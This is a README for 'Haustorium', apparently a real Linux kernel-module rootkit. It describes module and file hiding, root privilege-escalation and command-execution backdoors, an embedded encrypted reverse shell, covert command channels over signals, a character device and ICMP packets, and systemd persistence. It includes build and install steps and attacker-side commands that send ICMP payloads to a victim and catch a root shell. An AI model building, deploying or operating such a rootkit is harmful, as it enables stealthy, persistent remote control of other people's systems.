# Haustorium

My take on x86_64 LKM rootkits.

## Features

- Hide module from `lsmod` and `rmmod`;
- Hide files and directories;
- Backdoor for privilege escalation;
- Backdoor for bash-compatible command execution;
- Encrypted, full TTY reverse shell embedded into the LKM itself;
- Enable and disable features at runtime;
- User space interface via signals;
- User space interface via character device driver (`/dev/htm`);
- Netfilter interface via ICMP (some features disabled due to running in atomic context);
- A self-contained user space binary for loading, unloading and managing module features more easily (`htmctl`);
- Simple persistence via `systemd-modules-load`;

**Note**: by default, the module is configured to be stealthy, so some features (such as the character device interface) are not enabled during module load. To configure the features that should be initialized automatically, define the corresponding `HTM_INIT_*` constants in `src/htm/include/config.h` before compilation. Runtime messages are also disabled; to enable them, uncomment `HTM_DEBUG` in `src/htm/include/config.h`

### Commands

Haustorium controls features and performs actions via a set of commands that can be received by one or more of its interfaces. The commands supported by each interface are described later in this document.

- `disable-cdd`: disable character device interface;
- `disable-dfs`: stop exposing internal files exposed via `debugfs`;
- `disable-dfs-rsh`: stop exposing reverse shell files via `debugfs`;
- `disable-fs`: disable file system evasion (hiding paths containing `.haustorium`);
- `disable-nf`: disable Netfilter interface (receiving commands via ICMP packets);
- `enable-cdd`: enable character device interface (receiving commands via `/dev/htm`);
- `enable-dfs`: expose all internal files via `debugfs`;
- `enable-dfs-rsh`: expose reverse shell files via `debugfs`;
- `enable-fs`: enable file system evasion;
- `enable-nf`: enable Netfilter interface;
- `exec [command]`: execute `command` using the configured shell (`/usr/bin/bash` by default) in user space as the root user.
- `hide-module`: hide module from user space tools;
- `show-module`: expose module to user space tools;
- `sudo [pid]?`: change the UID, EUID, GID and EGID of a process identified by `pid` to 0. If no `pid` is given, get it from the currently running task;

## Tested On

| **Distribution** | **Kernel Version**  |
| ---------------- | ------------------- |
| Kali GNU/Linux   | 6.16.8              |
| Debian GNU/Linux | 6.12.57             |
| Ubuntu 22.04     | 5.15.0              |
| Ubuntu 16.04     | 4.15.0              |

## Installation

### 1. Install Dependencies

- Debian:

```shell
sudo apt install build-essential linux-headers-amd64
```

- Arch:

```shell
sudo pacman -S gcc make linux-headers
```

### 2. Clone This Repository

```shell
git clone --recursive https://github.com/hiatus/haustorium.git
```

### 3. Configure

The module's parameters can be changed directly in `src/htm/include/config.h`. For the changes to be reflected on `htmctl` as well, modify `/src/htmctl/include/config.h` accordingly.

To enable debugging messages during runtime, uncomment `HTM_DEBUG` in `src/htm/include/config.h`

### 4. Build

```shell
cd haustorium && make
```

### 5. Install

To install the module in the system, the `systemd-modules-load` service can be used. To do that, simply run:

```shell
make install
```

## User Space Client

Haustorium includes a separate binary, `htmctl`, to facilitate module loading and management in user space. The module itself is embedded in the binary, so there is no need to send both to the target system. Below is `htmctl`'s help banner:

```
htmctl [action]

General:
	help	Show this banner
	info	Display module information
	load	Load kernel object file
	unload	Unload the module

Module Management:
	disable-cdd	Disable character device interface
	disable-dfs	Stop exposing internal files exposed via debugfs
	disable-dfs-rsh	Stop exposing reverse shell files via debugfs
	disable-fs	Disable file system evasion (hiding paths containing ".haustorium")
	disable-nf	Disable Netfilter interface (receiving commands via ICMP packets)
	enable-cdd	Enable character device interface (receiving commands via /dev/htm)
	enable-dfs	Expose all internal files via debugfs
	enable-dfs-rsh	Expose reverse shell files via debugfs
	enable-fs	Enable file system evasion
	enable-nf	Enable Netfilter interface
	hide-module	Hide module from user space tools
	show-module	Expose module to user space tools
```

**Note**: `htmctl` uses the signal interface to manage the module, so not all features are supported.

## Reverse Shell

Haustorium's reverse shell is [snc](https://github.com/hiatus/snc). The `src/snc` folder is only a git submodule of the project. After compilation, `snc`'s ELF is included the `.rodata` section of the kernel module. When the `rsh` command is received, this binary blob is then exposed to user space via `debugfs`, copied to `/dev/shm` and executed via `call_usermodehelper` with the configured parameters; the `debugfs` file and directory are then removed.

## Signal Interface

Haustorium hooks `sys_kill` to intercept signals sent to `HTM_PID` and perform various actions. The available actions on this interface are:

- `disable-cdd`
- `disable-dfs`
- `disable-dfs-rsh`
- `disable-fs`
- `disable-nf`
- `enable-cdd`
- `enable-dfs`
- `enable-dfs-rsh`
- `enable-fs`
- `enable-nf`
- `hide-module`
- `show-module`
- `sudo`

**Note**: this interface can also receive signal `HTM_SIG_STATUS`, which returns 0 when the module is loaded.

## Character Device Interface

Haustorium can expose a character device at `/dev/htm` to receive commands via writes to the device and perform actions. The available actions on this interface are:

- `disable-cdd`
- `disable-dfs`
- `disable-dfs-rsh`
- `disable-fs`
- `disable-nf`
- `enable-cdd`
- `enable-dfs`
- `enable-dfs-rsh`
- `enable-fs`
- `enable-nf`
- `exec [command]`
- `hide-module`
- `show-module`
- `sudo [pid]?`

Via this interface, some actions (such as `sudo`) can receive arguments. 

- `exec [command]`: execute `command` in the configured shell (`/usr/bin/bash -c` by default) in user space as the root user.
- `sudo [pid]?`: if `pid` is given, elevate the privileges of the process with PID `pid`. If `pid` is not given, target the PID of the currently running task (in practice, the process that performed the write).

## Netfilter Interface

Haustorium can also receive its commands via the payload field in ICMP packets. The only limitation is the fact that Netfilter hooks run in `softirq` context, which makes performing non-atomic actions very dangerous. Because of this, less features are accepted via this interface:

- `disable-dfs`
- `disable-dfs-rsh`
- `enable-dfs`
- `enable-dfs-rsh`
- `hide-module`
- `show-module`
- `exec [command]`
- `rsh`

To craft and send these packets, the `script/htm-ping.py` can be used (make sure Scapy is installed):

```
user@attacker:~/haustorium$ python3 src/aux/htm-ping.py -i wlan0 -c 'exec echo "haustorium" > /tmp/notevil.txt' 192.168.0.123
```

To receive a reverse shell remotely, for example, send the `rsh` command using `htm-ping.py` and listen for the connection with [snc](https://github.com/hiatus/snc):

```
user@attacker:~/haustorium$ snc -r -k "haustorium" 46692
root@victim:~#
```

## References

- [Diamorphine](https://github.com/m0nad/Diamorphine) (by m0nad)
- [Reptile](https://github.com/f0rb1dd3n/Reptile) (by f0rb1dd3n)
- [Linux Kernel Hacking](https://github.com/xcellerator/linux_kernel_hacking) (by xcellerator)
- [snc](https://github.com/hiatus/snc)
